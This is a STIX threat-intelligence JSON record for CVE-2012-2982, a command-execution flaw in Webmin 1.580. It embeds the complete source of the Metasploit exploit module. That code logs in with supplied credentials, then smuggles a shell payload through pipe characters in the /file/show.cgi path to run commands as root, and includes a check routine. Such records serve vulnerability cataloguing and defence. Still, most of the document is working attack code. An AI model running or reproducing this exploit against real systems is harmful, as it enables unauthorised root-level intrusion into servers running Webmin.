{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82145c33-54a2-4ac8-9c48-eea2916d7006",
    "created": "2024-08-14T17:13:57.419911Z",
    "modified": "2024-08-14T17:13:57.419916Z",
    "name": "Webmin /file/show.cgi Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in Webmin 1.580. The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges. The module has been tested successfully with Webmin 1.580 over Ubuntu 10.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/webmin_show_cgi_exec.rb",
            "external_id": "webmin_show_cgi_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2982"
        },
        {
            "source_name": "reference",
            "url": "http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Webmin /file/show.cgi Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in Webmin\n        1.580. The vulnerability exists in the /file/show.cgi component and allows an\n        authenticated user, with access to the File Manager Module, to execute arbitrary\n        commands with root privileges. The module has been tested successfully with Webmin\n        1.580 over Ubuntu 10.04.\n      },\n      'Author'         => [\n        'Unknown', # From American Information Security Group\n        'juan vazquez' # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '85248'],\n          ['BID', '55446'],\n          ['CVE', '2012-2982'],\n          ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf'],\n          ['URL', 'https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Webmin 1.580', { }]],\n      'DisclosureDate' => '2012-09-06',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(10000),\n          OptBool.new('SSL', [true, 'Use SSL', true]),\n          OptString.new('USERNAME',  [true, 'Webmin Username']),\n          OptString.new('PASSWORD',  [true, 'Webmin Password'])\n        ])\n  end\n\n  def check\n\n    peer = \"#{rhost}:#{rport}\"\n\n    vprint_status(\"Attempting to login...\")\n\n    data = \"page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}\"\n\n    res = send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri'     => \"/session_login.cgi\",\n        'cookie'  => \"testing=1\",\n        'data'    => data\n      }, 25)\n\n    if res and res.code == 302 and res.get_cookies =~ /sid/\n      vprint_good \"Authentication successful\"\n      session = res.get_cookies.split(\"sid=\")[1].split(\";\")[0]\n    else\n      vprint_error \"Service found, but authentication failed\"\n      return Exploit::CheckCode::Detected\n    end\n\n    vprint_status(\"Attempting to execute...\")\n\n    command = \"echo #{rand_text_alphanumeric(rand(5) + 5)}\"\n\n    res = send_request_cgi(\n      {\n        'uri'     => \"/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|\",\n        'cookie'  => \"sid=#{session}\"\n      }, 25)\n\n\n    if res and res.code == 200 and res.message =~ /Document follows/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"Attempting to login...\")\n\n    data = \"page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}\"\n\n    res = send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri'     => \"/session_login.cgi\",\n        'cookie'  => \"testing=1\",\n        'data'    => data\n      }, 25)\n\n    if res and res.code == 302 and res.get_cookies =~ /sid/\n      session = res.get_cookies.scan(/sid\\=(\\w+)\\;*/).flatten[0] || ''\n      if session and not session.empty?\n        print_good \"Authentication successful\"\n      else\n        print_error \"Authentication failed\"\n        return\n      end\n      print_good \"Authentication successful\"\n    else\n      print_error \"Authentication failed\"\n      return\n    end\n\n    print_status(\"Attempting to execute the payload...\")\n\n    command = payload.encoded\n\n    res = send_request_cgi(\n      {\n        'uri'     => \"/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|\",\n        'cookie'  => \"sid=#{session}\"\n      }, 25)\n\n\n    if res and res.code == 200 and res.message =~ /Document follows/\n      print_good \"Payload executed successfully\"\n    else\n      print_error \"Error executing the payload\"\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}